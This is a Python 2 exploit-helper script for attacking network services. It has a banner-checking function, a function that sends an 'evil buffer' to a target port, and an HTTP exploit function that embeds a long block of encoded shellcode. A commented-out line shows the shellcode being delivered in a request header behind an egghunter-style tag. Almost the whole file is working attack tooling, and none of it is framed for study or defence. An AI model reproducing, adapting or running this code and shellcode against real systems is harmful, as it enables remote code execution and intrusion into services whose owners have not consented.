import socket, sys
import requests

def bannerchecktest( HOST, PORT, BANNER ):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(( HOST, PORT ))
        data = s.recv(1024)
        s.close()
        #print data
        if BANNER in data:
            return True
        else:
            return False
    except Exception as error:
        print error
        sys.exit()

def exploit( HOST, PORT, SPLOITSTRING ):
    print "Connecting to %s on port %s" % ( HOST, PORT )
    try:
        s=socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        s.connect(( HOST, PORT ))
        s.recv( 1024 )
        print "Sending evil buffer"
        s.send( SPLOITSTRING )
        s.close()
        return True

    except Exception as error:
        print error
        return False


def httpexploit( HOST, PORT, SPLOITSTRING ):
    try:
        shellcode = (
    "\xda\xd9\xbb\x1e\xc8\x8b\xdf\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
    "\x78\x83\xe8\xfc\x31\x58\x15\x03\x58\x15\xfc\x3d\x77\x36\x86"
    "\xbe\x88\xc9\xdb\x3d\x4d\xc2\x62\x85\x3e\x2b\x9b\xf9\x32\x87"
    "\x47\x66\x1f\x40\x36\x2c\xf4\x21\xc7\x64\x87\x06\x13\xe7\x73"
    "\xda\x05\x6a\xfb\x83\xee\x24\xcd\x98\x43\x96\x45\x1b\x63\x18"
    "\x9e\x70\x30\x4b\xc8\x25\xde\x12\x38\xf6\x98\x1a\x15\x8c\x64"
    "\x90\xc3\xe5\x24\xd9\x2b\xe9\xf7\x8a\x82\xd1\xa4\xd3\xd2\x8d"
    "\xe4\xab\x8f\x71\x07\x66\xfb\xe5\xbf\x88\x04\xf6\xd4\xbe\x54"
    "\x09\x1d\xa9\x91\x2d\xdc\xce\xe5\x1b\x4d\x42\x49\x2f\x3d\x40"
    "\x91\x7e\xee\xdb\x96\xb6\x78\x1a\xc4\x23\x01\x5d\xc0\xbd\xb0"
    "\xa0\xeb\x3d\xda\x3c\x14\xc2\xe5\x31\x9e\x53\x7d\xda\x0c\x9f"
    "\x4f\x22\x25\xaa\x50\xdd\x4a\xbd\x68\xdd\x4a\xc1\x88\xca\x37"
    "\x3e\x70\x0b\x58\xb6\x95\x3a\x58\xac\xde\x6d\x68\xa6\xb2\x81"
    "\x03\xea\x26\x11\x61\x23\x49\x92\xcc\x15\x64\x23\x7c\x65\xe7"
    "\xa7\x7f\xba\xc7\x96\x4f\xcf\x06\xde\xb2\x22\x5a\xb7\xb9\x91"
    "\x4a\xbc\xf4\x29\xe1\x8e\x19\x2a\x16\x46\x1b\x1b\x89\xdc\x42"
    "\xbb\x28\x30\xff\xf2\x32\x55\x3a\x4c\xc9\xad\xb0\x4f\x1b\xfc"
    "\x39\xe3\x62\x30\xc8\xfd\xa3\xf7\x33\x88\xdd\x0b\xc9\x8b\x1a"
    "\x71\x15\x19\xb8\xd1\xde\xb9\x64\xe3\x33\x5f\xef\xef\xf8\x2b"
    "\xb7\xf3\xff\xf8\xcc\x08\x8b\xfe\x02\x99\xcf\x24\x86\xc1\x94"
    "\x45\x9f\xaf\x7b\x79\xff\x0f\x23\xdf\x74\xbd\x30\x52\xd7\xaa"
    "\xf5\x5f\xe7\x2a\x92\xe8\x94\x18\x3d\x43\x32\x11\xb6\x4d\xc5"
    "\x56\xed\x2a\x59\xa9\x0e\x4b\x70\x6e\x5a\x1b\xea\x47\xe3\xf0"
    "\xea\x68\x36\x6c\xe2\xcf\xe9\x93\x0f\xaf\x59\x14\xbf\x58\xb0"
    "\x9b\xe0\x79\xbb\x71\x89\x12\x46\x7a\xa4\xbe\xcf\x9c\xac\x2e"
    "\x86\x37\x58\x8d\xfd\x8f\xff\xee\xd7\xa7\x97\xa7\x31\x7f\x98"
    "\x37\x14\xd7\x0e\xbc\x7b\xe3\x2f\xc3\x51\x43\x38\x54\x2f\x02"
    "\x0b\xc4\x30\x0f\xfb\x65\xa2\xd4\xfb\xe0\xdf\x42\xac\xa5\x2e"
    "\x9b\x38\x58\x08\x35\x5e\xa1\xcc\x7e\xda\x7e\x2d\x80\xe3\xf3"
    "\x09\xa6\xf3\xcd\x92\xe2\xa7\x81\xc4\xbc\x11\x64\xbf\x0e\xcb"
    "\x3e\x6c\xd9\x9b\xc7\x5e\xda\xdd\xc7\x8a\xac\x01\x79\x63\xe9"
    "\x3e\xb6\xe3\xfd\x47\xaa\x93\x02\x92\x6e\xa3\x48\xbe\xc7\x2c"
    "\x15\x2b\x5a\x31\xa6\x86\x99\x4c\x25\x22\x62\xab\x35\x47\x67"
    "\xf7\xf1\xb4\x15\x68\x94\xba\x8a\x89\xbd"
)
        #r=requests.get("http://%s:%s/%s" % (HOST, PORT, SPLOITSTRING ), headers={"content-type":"T00WT00W"+shellcode})
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(( HOST, PORT ))
        s.send( SPLOITSTRING )
        s.recv( 1024)
        s.close()
        return True
    except Exception as error:
        print error
        return False
